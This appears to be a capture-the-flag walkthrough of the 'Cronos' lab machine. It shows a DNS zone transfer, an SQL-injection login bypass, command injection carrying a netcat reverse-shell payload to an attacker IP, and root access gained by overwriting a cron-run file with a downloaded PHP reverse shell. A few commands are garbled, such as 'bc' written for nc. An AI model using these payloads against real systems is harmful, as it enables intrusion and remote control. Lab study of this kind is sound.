Starting with an nmap sear, I see port `53` has a DNS server

```
$ nmap -sC -sV 10.129.227.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 10:47 CDT
Nmap scan report for 10.129.227.211
Host is up (0.075s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

An NSLOOKUP on the ip address, finds a nameserver:

```
$ nslookup 10.129.227.211 10.129.227.211
211.227.129.10.in-addr.arpa	name = ns1.cronos.htb.
```

I do a zone transfer to look at the DNS records:

```
$ dig axfr @10.129.227.211 cronos.htb

; <<>> DiG 9.18.24-1-Debian <<>> axfr @10.129.227.211 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 73 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Sun Oct 20 11:18:03 CDT 2024
;; XFR size: 7 records (messages 1, bytes 203)
```

Adding the admin subdomain to the hosts file:

```
echo "10.129.227.211 admin.cronos.htb" | sudo tee -a /etc/hosts
```

I get a user signin page, where I can sign in using SQL injection, as a username I use `admin'-- -`, then use any password as it's commented out by the username.

The first page is `welcome.php`, where there is the DNS command `traceroute` and space for user input where I see an ip address. This is a bit of a hint to use command injection, `8.8.8.8;whoami` and get the output ` www-data`.

As command injection has been proven I can try getting a shell on this box starting a netcat listener on my local, and injecting a bash shell on the web-app.

I open up `burp` and change the `command=` to a a reverse shell, with certain characters encoded as `base64`

```
command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.207+1234+>/tmp/fcd
```

Locally I run the netcat listener:

```
$ sudo bc -lnvp 1234
```

I find the user flag on `/home/noulis/user.txt`

Using the enumeration script found on github, locally I run:

```
git clone https://github.com/rebootuser/LinEnum
```

I run a python web server in the directory with the script:

```
python3 -m http.server 8000
```

I get the script by running curl:

```
curl {my local ip}:8000/LinEnum.sh > linenum.sh
```

Then I run the script on the attacking box:

```
$ sh linenum.sh > output.txt

$ cat output.txt | grep laravel
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

I download a php reverse shell by:

```
$ git clone https://github.com/pentestmonkey/php-reverse-shell
$ chmod +x php-reverse-shell.php
```

In a text editor, I change the ip address to my local ip address, and run the python http server again.

On the victim box I curl the web-server, then mv the reverse shell to location where the cron job executes the laravel file under root:
```
$ curl 10.10.14.207:8000/php-reverse-shell.php >php-reverse-shell.php
$ mv /tmp/php-reverse-shell.php /var/www/laravel/artisan
```

Run netcat locally under the port enumerated in the php-reverse-shell and wait a minute, there I will get root access to the box.

From there the root flag is found in `/root/root.txt`
